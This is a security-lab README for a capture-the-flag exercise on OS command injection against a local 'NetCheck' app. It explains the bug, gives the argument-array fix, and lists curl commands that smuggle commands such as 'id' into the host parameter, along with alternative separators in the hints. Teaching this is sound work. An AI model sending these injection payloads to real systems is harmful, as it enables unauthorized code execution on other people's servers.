# command-injection

## Concepts

**Command injection** is when an application passes user input into a **system shell** command.
Because the shell treats certain characters (`;`, `&&`, `|`, `$(…)`, backticks) as **control syntax,
not data**, an attacker can append or chain their own commands onto the one the app meant to run.

- **Why it matters.** Unlike SQL injection (scoped to the database), command injection gives **code
  execution on the operating system**, with the privileges of the web process — read files, plant a
  backdoor, pivot into the network, take the host. It's one of the most severe web bugs and an OWASP
  Top 10 fixture.
- **How it works.** Vulnerable code builds a shell string from input:
  ```python
  os.system("ping -c 1 " + host)
  ```
  With `host = 127.0.0.1` the shell runs `ping -c 1 127.0.0.1`. With `host = 127.0.0.1; id` the shell
  sees **two** commands:
  ```
  ping -c 1 127.0.0.1   # the intended command
  id                    # yours, injected
  ```
  `;` ends one command and starts another; `&&` chains conditionally, `|` pipes, and `$(…)` /
  backticks substitute command output. If the app strips some metacharacters, others usually work.
- **The fix.** Never build a shell string from input — use an **argument array** so input is always a
  single argument, never shell syntax:
  ```python
  subprocess.run(["ping", "-c", "1", host])   # shell=False
  ```

This lab's `/ping` endpoint runs `ping -c 1 <host>` in a shell on input you control.

## Tasks

Start the lab with `./lab up command-injection`, then open a shell:
`./lab shell command-injection`. NetCheck runs at `http://127.0.0.1:8080` — drive it with `curl`.

1. **Recon** — run a normal check, then prove chaining works:
   ```
   curl -s -G http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1'
   curl -s -G http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1; echo INJECTED'
   ```
   If `INJECTED` appears in the output, your second command ran.
2. **Exploit** — inject a command that runs on the server and writes the flag, capturing a real
   command's output to prove execution:
   ```
   curl -s -G http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1; id > /flag/solved'
   ```
   (If `;` is filtered, try `&& `, `| `, `$(…)` or backticks.)
3. **Capture the flag** — confirm it, and that it holds the command output:
   ```
   cat /flag/solved      # should contain uid=...
   ```
4. **Record your findings** in `/root/answers.txt` (`OPERATOR`, `IMPACT`, `FIX`).

Check your work from the host: `./lab check command-injection`.

<details>
<summary>Hints</summary>

- Use `curl -G --data-urlencode` so your metacharacters and spaces reach the server intact.
- `; id > /flag/solved` runs `id` and redirects its output into the flag file — the redirect happens
  on the server, so the flag ends up containing `uid=...`.
- A bare `; touch /flag/solved` creates the file but with no proof of execution; capture a command's
  output instead.
- Other separators if one is filtered: `&&`, `||`, `|`, `$(id > /flag/solved)`, `` `id > /flag/solved` ``.

</details>

## My notes

<!-- Screenshots: ./lab shot command-injection ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `insecure-file-upload` — the other path to code execution on this app layer (upload a webshell).
- `sqli-auth-bypass`, `reflected-xss` — injection's cousins (into SQL and into HTML/JS).
